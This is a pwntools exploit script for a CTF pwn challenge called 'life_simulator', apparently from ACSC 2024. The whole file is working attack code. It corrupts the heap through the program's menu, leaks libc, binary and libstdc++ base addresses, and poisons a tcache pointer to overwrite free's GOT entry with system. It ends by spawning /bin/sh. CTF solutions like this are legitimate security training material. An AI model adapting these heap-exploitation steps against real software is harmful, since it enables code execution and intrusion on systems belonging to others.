

from pwn import *

p = process("./life_simulator")
#p = remote("life-simulator.chal.2024.ctf.acsc.asia", 9000)

p.sendlineafter(b"S/M/L", b"A"*0x80)

def simulate():
    p.sendlineafter(b">", b"1")

def add_lifeform(x_pos, y_pos, x_speed, y_speed, name):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b":", str(x_pos).encode())
    p.sendlineafter(b":", str(y_pos).encode())
    p.sendlineafter(b":", str(x_speed).encode())
    p.sendlineafter(b":", str(y_speed).encode())
    p.sendlineafter(b":", name) 

def add_fruit(x_pos, y_pos):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b":", str(x_pos).encode())
    p.sendlineafter(b":", str(y_pos).encode())

def add_poison(x_pos, y_pos):
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b":", str(x_pos).encode())
    p.sendlineafter(b":", str(y_pos).encode())

def print_stats():
    p.sendlineafter(b">", b"5")

for i in range(16):
    print(i)
    add_lifeform(i, 20, 0, 0, b'asdfghjk')

add_lifeform(0, 19, 0, 0, b'\0'*0x80)
add_lifeform(2, 0, 1, 0, b'/bin/sh\0' + b'\0'*0x28)
add_lifeform(0, 17, 0, 0, b'\0'*0xd0 + p64(0xffffffe8) + p64(0)*5)

add_lifeform(0, 6, 1, 0, b'bug')
add_fruit(1, 6)
add_fruit(2, 6)
add_fruit(3, 6)

simulate()
simulate()
simulate()

add_lifeform(2, 5, 0, 0, b'\x01')
# update this line incase of "strong" ASLR
libc_leak = u64(p.recvuntil(b"\x7f")[-6:] + b'\0\0')
print(hex(libc_leak))
libc_base = libc_leak - 0x21ace0
system = libc_base + 0x50d70 
exec_leak_add = libc_base + 0x21c060
add_lifeform(180, 0, 0, 0, b'\x01')
add_lifeform(177, 0, 0, 0, b'\x21')
add_lifeform(0x15a8, 0, 0, 0, b'\x30')
add_lifeform(0x15a9, 0, 0, 0, b'\x00')
add_lifeform(0x15aa, 0, 0, 0, b'\x00')
add_lifeform(0x15ab, 0, 0, 0, b'\x00')
add_lifeform(0x15a0, 0, 0, 0, b'\x10')

add_lifeform(0x1d08, 0, 0, 0, b'\x40')
print_stats()
p.recvuntil("asdfghjk")
p.recv(0x28)
heap_leak = u64(p.recv(6) + b'\0\0')
print(hex(heap_leak))

for i,j in enumerate(p64(exec_leak_add)[:6]):
    print(i)
    add_lifeform(0x1d00+i, 0, 0, 0, bytes([j]))

print_stats()
p.recvuntil("name: ")

exec_leak = u64(p.recv(6) + b'\0\0')
print(hex(exec_leak))
p.recvuntil("Add poison")

libcpp_leak_add = exec_leak - 0x2a9
for i,j in enumerate(p64(libcpp_leak_add)[:6]):
    print(i)
    add_lifeform(0x1d40+i, 0, 0, 0, bytes([j]))

print_stats()
p.recvuntil("name: ")
p.recvuntil("name: ")

libcpp_leak = u64(p.recv(6) + b'\0\0')
print(hex(libcpp_leak))
p.recvuntil("Add poison")

libcpp_base = libcpp_leak - 0xad8c0
got_free = libcpp_base + 0x226c38-0x28

lol = got_free ^ (heap_leak >> 12)
for i,j in enumerate(p64(lol)[:6]):
    print(i)
    add_lifeform(0x1700+i, 0, 0, 0, bytes([j]))
p.recvuntil("Add poison")

add_lifeform(10, 0, 0, 0, b"/bin/sh\0" + p64(system)*5)

p.interactive()
